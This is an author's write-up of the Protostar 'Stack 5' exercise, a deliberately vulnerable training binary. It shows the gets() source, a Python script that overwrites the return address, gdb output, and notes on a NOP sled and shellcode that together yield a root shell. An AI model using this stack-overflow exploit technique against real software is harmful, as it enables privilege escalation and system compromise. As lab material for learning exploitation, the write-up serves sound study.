
___________________________________________ EXPLOIT EXERCISES _________________________________________
			
========= Abhinav Thakur
========= compilepeace@gmail.com


######### PROTOSTAR

                                  =-=-=-=-=-=   STACK - 5   =-=-=-=-=




1.	First I log into the virtual machine with
		username : user
		password : user



2.	Source code provided is - 
		
	#include <stdlib.h>
	#include <unistd.h>
	#include <stdio.h>
	#include <string.h>

	int main(int argc, char **argv)
	{
	  char buffer[64];

	  gets(buffer);
	}
	

3.	This challenge introduces a cute little code which simply takes an input buffer which is 
	intended to store only 64 bytes with gets() which as you already know is damn vulnerable
	to an overflow.	The challenge intends to introduce shellcode, so in this challenge we 
	use shellcode to gain root priveleges. 


4.	We craft an exploit input with the help of python programming language (which is well 
	suited for rapid exploit development). The script is as bellow -

		
			# Author	 : Abhinav Thakur
			# E-Mail	 : compilepeace@gmail.com
			# script	 : exploit5.py
					
			import struct 

			padding = "\x41"*76						
			eip = struct.pack("I", 0xbffff7c0)				# filling eip with binary data
			
			payload = padding + eip + "\xcc"

			print payload


		$ python exploit5.py > ~/input_file
		$ gdb -q stack5

		(gdb) break *main+21
		(gdb) run < /home/user/input_file
		.
		.
		.
		(gdb) c	

		Program recieved signal SIGTRAP, Trace/brakepoint trap.
		0xbffff7d1 in ?? ()


5.	This shows that eip is overwritten and it executes the instruction at address 
	0xbffff7c0 where opcode '\xcc' is kind of a breakpoint which stops the flow
	of execution as soon as the processor executes this opcode.
	We now place a shellcode (taken from shell-storm.org) and try to shift the control
	to the shellcode.

	Here's a behaviour i am not able to figure out - in the debugger when i give the run
	command (r < /home/user/input_file) the shellcode does not execute but if i give the
	subsequent command with a semicolon (gdb) 'r;' (without quotes)
	a shell is spawned !!.

	After spending much of the time (although i was not able to figure out the above 
	behaviour) trying to exploit the binary without NOP sled (which did'nt just happened
	I have an assumption about something which i have explained bellow), I tried using 
	NOP sled it happened.

	Finally,
	To exploit 'stack5' completely, we will need to put at least 4 NOP "\x90" instructions
	(which is used to waste CPU cycles and in our case it just behaves as a slide for eip
	down to location of shellocode). Without 4 NOP's it gives a segmentationfault (maybe
	because it takes in exact 4 bytes from memory to execute and the shellcode's last opcode
	does not fit in those 4 bytes to be executed).

		$ pwd
		/home/user
		$ python exploit5 > input_file
		$ cat input_file - | /opt/protostar/bin/stack5
		whoami
		root


	NOTE:	If we simply pipe the malacious input to the 'stack5' binary, we will get a
			shell but eventually it will close because there is no more input to be given.
			So we use '-' with cat which takes input from the STDIN and pipes it to 
			the new process (shell) opened up by the shellcode. If there is probleum in 
			understanding it - Read more about 'cat' and 'pipes' to	understand this completely. 


	cheers,
